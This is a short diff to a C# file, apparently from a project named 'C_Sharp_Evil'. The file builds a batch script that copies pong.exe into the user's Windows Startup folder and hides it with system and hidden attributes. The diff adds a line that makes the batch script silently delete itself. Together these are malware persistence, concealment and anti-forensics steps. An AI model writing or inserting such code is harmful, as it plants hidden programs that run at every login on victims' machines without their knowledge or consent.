@@ -53,6 +53,7 @@ namespace C_Sharp_Evil
                                "@Echo on",
                                "Xcopy  pong.exe \"" + @"C:\Users\" + Environment.UserName + @"\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\" + "\"",
                                "attrib " + @"C:\Users\" + Environment.UserName + @"\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\pong.exe" + "\"" + "+s +h",
+                               "( del /q /f \"%~f0\" >nul 2>&1 & exit /b 0  )",
                            };
 
         public Evil()
